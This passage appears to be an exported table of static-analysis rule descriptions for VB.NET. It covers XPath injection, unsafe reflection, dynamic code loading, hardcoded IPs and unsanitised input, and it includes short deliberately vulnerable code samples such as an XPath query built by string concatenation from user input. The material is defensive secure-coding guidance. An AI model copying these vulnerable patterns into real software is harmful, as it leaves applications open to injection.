  <li> <code>System.Xml.XPath.XPathNavigator.Matches(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string, System.Xml.IXmlNamespaceResolver)</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
Dim expression As String = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""
xpathNavigator.Evaluate(expression);  ' Questionable. Check if the XPATH expression is safe.
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",vbnet:S4817,vbnet,VB.NET,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<p>This rule will create issues when the following methods are called:</p>
<ul>
  <li> <code>System.Xml.XmlNode.SelectNodes(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectNodes(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Matches(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string, System.Xml.IXmlNamespaceResolver)</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
Dim expression As String = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""
xpathNavigator.Evaluate(expression);  ' Questionable. Check if the XPATH expression is safe.
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",Executing XPath expressions is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Reflection

Dim dynClass = Type.GetType(""MyInternalClass"")
'Questionable.Using BindingFlags.NonPublic will return non-public members
Dim bindingAttr As BindingFlags = BindingFlags.NonPublic Or BindingFlags.Static
Dim dynMethod As MethodInfo = dynClass.GetMethod(""mymethod"", bindingAttr)
Dim result = dynMethod.Invoke(dynClass, Nothing)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",vbnet:S3011,vbnet,VB.NET,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Reflection

Dim dynClass = Type.GetType(""MyInternalClass"")
'Questionable.Using BindingFlags.NonPublic will return non-public members
Dim bindingAttr As BindingFlags = BindingFlags.NonPublic Or BindingFlags.Static
Dim dynMethod As MethodInfo = dynClass.GetMethod(""mymethod"", bindingAttr)
Dim result = dynMethod.Invoke(dynClass, Nothing)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",Changing or bypassing accessibility is security-sensitive,[],CRITICAL,"['cert', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Reflection

Class TestReflection

    Public Shared Sub Run(typeName As String, methodName As String, fieldName As String, propertyName As String, moduleName As String)

        Assembly.Load(...) ' Questionable
        Assembly.LoadFile(...) ' Questionable
        Assembly.LoadFrom(...) ' Questionable
        Assembly.LoadWithPartialName(...) ' Questionable + deprecated

        Assembly.ReflectionOnlyLoad(...)  ' This is OK as the resulting type is not executable.
        Assembly.ReflectionOnlyLoadFrom(...) ' This is OK as the resulting type is not executable.
        Dim asm = GetType(TestReflection).Assembly

        ' Review this code to make sure that the module, type, method And field are safe
        Dim type As Type = asm.GetType(typeName) ' Questionable
        Dim [module] As [Module] = asm.GetModule(moduleName) ' Questionable

        type = System.Type.GetType(typeName) ' Questionable
        type = type.GetNestedType(typeName) ' Questionable
        type = type.GetInterface(typeName) ' Questionable
        Dim method As MethodInfo = type.GetMethod(methodName) ' Questionable
        Dim field As FieldInfo = type.GetField(fieldName) ' Questionable
        Dim prop as PropertyInfo = type.GetProperty(propertyName) ' Questionable


        ' Review this code to make sure that the modules, types, methods And fields are used safely
        Dim modules = asm.GetModules() ' Questionable
        modules = asm.GetLoadedModules() ' Questionable

        Dim types = asm.GetTypes() ' Questionable
        types = asm.GetExportedTypes() ' Questionable

        types = type.GetNestedTypes() ' Questionable
        Dim methods = type.GetMethods() ' Questionable
        Dim fields = type.GetFields() ' Questionable
        Dim properties = type.GetProperties() ' Questionable
        Dim members = type.GetMembers() ' Questionable
        members = type.GetMember(methodName) ' Questionable
        members = type.GetDefaultMembers() ' Questionable

        type.InvokeMember(...) ' Questionable, when the method name is provided as a string
        asm.CreateInstance(typeName) ' Questionable

        type = Type.ReflectionOnlyGetType(typeName, True, True) ' This is OK as the resulting type is not executable.

        Activator.CreateComInstanceFrom(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstance(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstanceFrom(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstance(Of ...)() ' OK - can only be created from a referenced type

    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>No issue will be created if one of the methods above is called with a hard-coded type/method/field/property/interface/module name. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
assembly.GetType(""MyHardcodedType"")
</pre>
<p>No issue will be created if one of the methods is called on an instance of <em>Type</em> created using <em>GetType</em> operator. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
typeof(CustomType).GetMethods();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",vbnet:S1523,vbnet,VB.NET,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Reflection

Class TestReflection

    Public Shared Sub Run(typeName As String, methodName As String, fieldName As String, propertyName As String, moduleName As String)

        Assembly.Load(...) ' Questionable
        Assembly.LoadFile(...) ' Questionable
        Assembly.LoadFrom(...) ' Questionable
        Assembly.LoadWithPartialName(...) ' Questionable + deprecated

        Assembly.ReflectionOnlyLoad(...)  ' This is OK as the resulting type is not executable.
        Assembly.ReflectionOnlyLoadFrom(...) ' This is OK as the resulting type is not executable.
        Dim asm = GetType(TestReflection).Assembly

        ' Review this code to make sure that the module, type, method And field are safe
        Dim type As Type = asm.GetType(typeName) ' Questionable
        Dim [module] As [Module] = asm.GetModule(moduleName) ' Questionable

        type = System.Type.GetType(typeName) ' Questionable
        type = type.GetNestedType(typeName) ' Questionable
        type = type.GetInterface(typeName) ' Questionable
        Dim method As MethodInfo = type.GetMethod(methodName) ' Questionable
        Dim field As FieldInfo = type.GetField(fieldName) ' Questionable
        Dim prop as PropertyInfo = type.GetProperty(propertyName) ' Questionable


        ' Review this code to make sure that the modules, types, methods And fields are used safely
        Dim modules = asm.GetModules() ' Questionable
        modules = asm.GetLoadedModules() ' Questionable

        Dim types = asm.GetTypes() ' Questionable
        types = asm.GetExportedTypes() ' Questionable

        types = type.GetNestedTypes() ' Questionable
        Dim methods = type.GetMethods() ' Questionable
        Dim fields = type.GetFields() ' Questionable
        Dim properties = type.GetProperties() ' Questionable
        Dim members = type.GetMembers() ' Questionable
        members = type.GetMember(methodName) ' Questionable
        members = type.GetDefaultMembers() ' Questionable

        type.InvokeMember(...) ' Questionable, when the method name is provided as a string
        asm.CreateInstance(typeName) ' Questionable

        type = Type.ReflectionOnlyGetType(typeName, True, True) ' This is OK as the resulting type is not executable.

        Activator.CreateComInstanceFrom(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstance(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstanceFrom(...) ' Questionable, when the type name is provided as a string
        Activator.CreateInstance(Of ...)() ' OK - can only be created from a referenced type

    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>No issue will be created if one of the methods above is called with a hard-coded type/method/field/property/interface/module name. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
assembly.GetType(""MyHardcodedType"")
</pre>
<p>No issue will be created if one of the methods is called on an instance of <em>Type</em> created using <em>GetType</em> operator. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
typeof(CustomType).GetMethods();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2018-11-06T12:16:58+0100,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Dim ip = ""192.168.12.42"" ' Noncompliant
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim ip = ConfigurationManager.AppSettings(""myapplication.ip"") ' Compliant
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Although ""::"" is a valid IPv6 address, the rule doesn't report on it. </li>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",vbnet:S1313,vbnet,VB.NET,"<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901"">CVE-2006-5901</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725"">CVE-2005-3725</a> </li>
</ul>
<p>Today's services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It forces the same address to be used in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service at this address or spoof the IP address. Such an attack is always
possible, but in the case of a hardcoded IP address the fix will be much slower, which will increase an attack's impact.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> make the IP address configurable. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Dim ip = ""192.168.12.42"" ' Noncompliant
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim ip = ConfigurationManager.AppSettings(""myapplication.ip"") ' Compliant
Dim address = IPAddress.Parse(ip)
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Although ""::"" is a valid IPv6 address, the rule doesn't report on it. </li>
  <li> No issue is reported for 127.0.0.1 because loopback is not considered as sensitive </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qQCHAQ"">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>",Using hardcoded IP addresses is security-sensitive,[],MINOR,['cert'],SECURITY_HOTSPOT
2016-11-07T15:36:18+0100,"<p>The requirement for a final <code>Case Else</code> clause is defensive programming.</p>
<p>This clause should either take appropriate action or contain a suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case param ' Noncompliant - Case Else clause is missing
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case param
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
  Case Else ' Compliant
    DoSomethingElse()
End Select
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>",vbnet:S131,vbnet,VB.NET,"<p>The requirement for a final <code>Case Else</code> clause is defensive programming.</p>
<p>This clause should either take appropriate action or contain a suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case param ' Noncompliant - Case Else clause is missing
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case param
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
  Case Else ' Compliant
    DoSomethingElse()
End Select
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/478.html"">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>","""Select"" statements should end with a ""Case Else"" clause",[],CRITICAL,"['cert', 'cwe', 'misra']",CODE_SMELL
2018-11-29T11:10:38+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Public Class C
    Public Sub Main()
        Dim x = Console.[In] ' Questionable
        Console.Read() ' Questionable
        Console.ReadKey() ' Questionable
        Console.ReadLine() ' Questionable
        Console.OpenStandardInput() ' Questionable
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
Imports System

Public Class C
    Public Sub Main()
        Console.ReadKey() ' Return value is ignored
        Console.ReadLine() ' Return value is ignored
    End Sub
End Class
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",vbnet:S4829,vbnet,VB.NET,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Public Class C
    Public Sub Main()
        Dim x = Console.[In] ' Questionable
        Console.Read() ' Questionable
        Console.ReadKey() ' Questionable
        Console.ReadLine() ' Questionable
        Console.OpenStandardInput() ' Questionable
    End Sub
End Class
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
Imports System

Public Class C
    Public Sub Main()
        Console.ReadKey() ' Return value is ignored
        Console.ReadLine() ' Return value is ignored
    End Sub
End Class
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<pre>
Module Program
    Sub Main(args As String()) ' Questionable as there is a reference to ""args"" in the procedure.
        Console.WriteLine(args(0))
    End Sub
End Module
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
